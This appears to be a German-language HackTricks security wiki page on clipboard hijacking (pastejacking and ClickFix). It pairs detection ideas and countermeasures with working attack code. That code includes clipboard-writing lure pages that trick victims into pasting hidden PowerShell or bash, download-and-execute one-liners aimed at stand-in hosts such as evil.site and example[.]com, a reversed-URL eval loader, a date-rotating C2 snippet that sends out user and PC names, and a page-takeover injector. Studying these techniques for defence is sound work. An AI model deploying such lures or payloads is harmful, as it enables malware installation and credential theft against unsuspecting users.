# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Füge niemals etwas ein, das du nicht selbst kopiert hast." – alter, aber nach wie vor gültiger Rat

## Übersicht

Clipboard hijacking – also known as *pastejacking* – macht sich die Tatsache zunutze, dass Benutzer routinemäßig Befehle kopieren und einfügen, ohne sie zu prüfen. Eine bösartige Webseite (oder jeder JavaScript-fähige Kontext wie eine Electron- oder Desktop-Anwendung) legt programmgesteuert vom Angreifer kontrollierten Text in die Zwischenablage des Systems. Die Opfer werden dazu verleitet, normalerweise durch sorgfältig gestaltete Social-Engineering-Anweisungen, **Win + R** (Ausführen-Dialog), **Win + X** (Quick Access / PowerShell) zu drücken oder ein Terminal zu öffnen und den Inhalt der Zwischenablage einzufügen, wodurch beliebige Befehle sofort ausgeführt werden.

Weil **keine Datei heruntergeladen und kein Anhang geöffnet wird**, umgeht die Technik die meisten E-Mail- und Web-Content-Sicherheitskontrollen, die Anhänge, macros oder direkte Befehlsausführung überwachen. Der Angriff ist daher beliebt in Phishing-Kampagnen, die Commodity-Malware-Familien wie NetSupport RAT, Latrodectus loader oder Lumma Stealer ausliefern.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ältere Kampagnen verwendeten `document.execCommand('copy')`, neuere setzen auf die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).

## Der ClickFix / ClearFake-Ablauf

1. Der Benutzer besucht eine typosquattete oder kompromittierte Website (z. B. `docusign.sa[.]com`)
2. Eingeschleustes **ClearFake**-JavaScript ruft einen `unsecuredCopyToClipboard()`-Helper auf, der stillschweigend einen Base64-kodierten PowerShell-Einzeiler in die Zwischenablage schreibt.
3. HTML-Anweisungen fordern das Opfer auf: *“Drücken Sie **Win + R**, fügen Sie den Befehl ein und drücken Sie Enter, um das Problem zu beheben.”*
4. `powershell.exe` wird ausgeführt und lädt ein Archiv herunter, das eine legitime ausführbare Datei sowie eine bösartige DLL enthält (klassisches DLL sideloading).
5. Der Loader entschlüsselt weitere Stufen, injiziert Shellcode und richtet Persistenz ein (z. B. scheduled task) – und führt letztlich NetSupport RAT / Latrodectus / Lumma Stealer aus.

### Beispiel NetSupport RAT-Kette
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimes Java WebStart) durchsucht sein Verzeichnis nach `msvcp140.dll`.
* Die bösartige DLL löst APIs dynamisch mit **GetProcAddress** auf, lädt zwei Binaries (`data_3.bin`, `data_4.bin`) via **curl.exe** herunter, entschlüsselt sie mit einem rolling XOR key `"https://google.com/"`, injiziert den finalen Shellcode und entpackt **client32.exe** (NetSupport RAT) in `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Lädt `la.txt` mit **curl.exe** herunter
2. Führt den JScript-Downloader in **cscript.exe** aus
3. Holt ein MSI payload → legt `libcef.dll` neben einer signierten Anwendung ab → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Der **mshta**-Aufruf startet ein verstecktes PowerShell-Skript, das `PartyContinued.exe` abruft, `Boat.pst` (CAB) extrahiert, `AutoIt3.exe` mittels `extrac32` und Dateikonkatenation rekonstruiert und schließlich ein `.a3x`-Skript ausführt, das Browser-Zugangsdaten an `sumeriavgv.digital` exfiltriert.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK mit rotierendem C2 (PureHVNC)

Einige ClickFix-Kampagnen verzichten vollständig auf Datei-Downloads und fordern Opfer auf, eine One‑Liner-Zeile einzufügen, die JavaScript über WSH abruft und ausführt, persistiert und den C2 täglich rotiert. Beispielhafte beobachtete Kette:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Hauptmerkmale
- Obfuskierte URL wird zur Laufzeit umgedreht, um eine oberflächliche Inspektion zu vereiteln.
- JavaScript persistiert sich über einen Startup LNK (WScript/CScript) und wählt den C2 nach dem aktuellen Tag aus – ermöglicht schnelle domain rotation.

Minimales JS-Fragment, das verwendet wird, um C2s nach Datum zu rotieren:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Next stage commonly deploys a loader that establishes persistence and pulls a RAT (e.g., PureHVNC), often pinning TLS to a hardcoded certificate and chunking traffic.

Detection ideas specific to this variant
- Prozessbaum: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Autostart‑Artefakte: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, der WScript/CScript mit einem JS‑Pfad unter `%TEMP%`/`%APPDATA%` aufruft.
- Registry/RunMRU‑ und Kommandozeilen‑Telemetrie, die `.split('').reverse().join('')` oder `eval(a.responseText)` enthält.
- Wiederholte `powershell -NoProfile -NonInteractive -Command -` Aufrufe mit großen stdin‑payloads, um lange Skripte ohne lange Kommandozeilen einzuspeisen.
- Geplante Tasks, die anschließend LOLBins wie `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` unter einem updater‑artigen Task/Pfad ausführen (z. B. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Täglich rotierende C2‑Hostnamen und URLs mit dem Muster `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Korrelieren Sie Zwischenablage‑Schreibereignisse, gefolgt von Win+R→Einfügen und dann unmittelbarer `powershell.exe`‑Ausführung.

Blue‑Teams können Zwischenablage-, Prozess‑Erstellungs‑ und Registry‑Telemetrie kombinieren, um Pastejacking‑Missbrauch zu lokalisieren:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` enthält eine Historie von **Win + R**‑Befehlen – suchen Sie nach ungewöhnlichen Base64-/obfuskierten Einträgen.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** für Dateianlagen unter `%LocalAppData%\Microsoft\Windows\WinX\` oder temporären Ordnern unmittelbar vor dem verdächtigen 4688‑Ereignis.
* EDR‑Zwischenablage‑Sensoren (falls vorhanden) – korrelieren Sie `Clipboard Write`, gefolgt unmittelbar von einem neuen PowerShell‑Prozess.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Aktuelle Kampagnen massenproduzieren gefälschte CDN/Browser‑Verifikationsseiten ("Just a moment…", IUAM‑style), die Benutzer dazu zwingen, betriebssystem­spezifische Befehle aus ihrer Zwischenablage in native Konsolen zu kopieren. Dadurch wird die Ausführung aus der Browser‑Sandbox heraus verlagert und funktioniert sowohl unter Windows als auch macOS.

Key traits of the builder-generated pages
- OS‑Erkennung via `navigator.userAgent`, um payloads anzupassen (Windows PowerShell/CMD vs. macOS Terminal). Optionale Decoys/No‑Ops für nicht unterstützte OS, um die Illusion aufrechtzuerhalten.
- Automatisches Clipboard‑Copy bei harmlosen UI‑Aktionen (Checkbox/Copy), während der sichtbare Text vom tatsächlichen Zwischenablage‑Inhalt abweichen kann.
- Mobile‑Blocking und ein Popover mit Schritt‑für‑Schritt‑Anweisungen: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Optionale Obfuskation und Single‑File Injector, um das DOM einer kompromittierten Site mit einer in Tailwind gestalteten Verifikations‑UI zu überschreiben (keine neue Domain‑Registrierung erforderlich).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence of the initial run
- Verwende `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, damit die Ausführung nach dem Schließen des Terminals fortgesetzt wird und sichtbare Artefakte reduziert werden.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Seiten, die Clipboard API an Verifizierungs-Widgets binden; Diskrepanz zwischen angezeigtem Text und Clipboard-Payload; Verzweigungen basierend auf `navigator.userAgent`; Tailwind + Single-Page-Ersetzung in verdächtigen Kontexten.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` kurz nach einer Browser-Interaktion; Batch/MSI-Installer, die aus `%TEMP%` ausgeführt werden.
- macOS endpoint: Terminal/iTerm, das `bash`/`curl`/`base64 -d` mit `nohup` startet in Nähe von Browser-Ereignissen; Hintergrundjobs, die das Schließen des Terminals überleben.
- Korrelation von `RunMRU` (Win+R)-Verlauf und Clipboard-Schreibvorgängen mit nachfolgender Erstellung von Konsolenprozessen.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Gegenmaßnahmen

1. Browser-Härtung – Schreibzugriff auf Clipboard deaktivieren (`dom.events.asyncClipboard.clipboardItem` etc.) oder Benutzeraktion erforderlich machen.
2. Sicherheitsbewusstsein – Benutzer darin schulen, sensible Befehle *einzugeben* oder sie zuerst in einen Texteditor einzufügen.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control, um beliebige Einzeiler zu blockieren.
4. Netzwerk-Kontrollen – ausgehende Verbindungen zu bekannten pastejacking- und Malware C2-Domains blockieren.

## Verwandte Tricks

* **Discord Invite Hijacking** nutzt oft denselben ClickFix-Ansatz, nachdem Benutzer in einen bösartigen Server gelockt wurden:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Referenzen

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
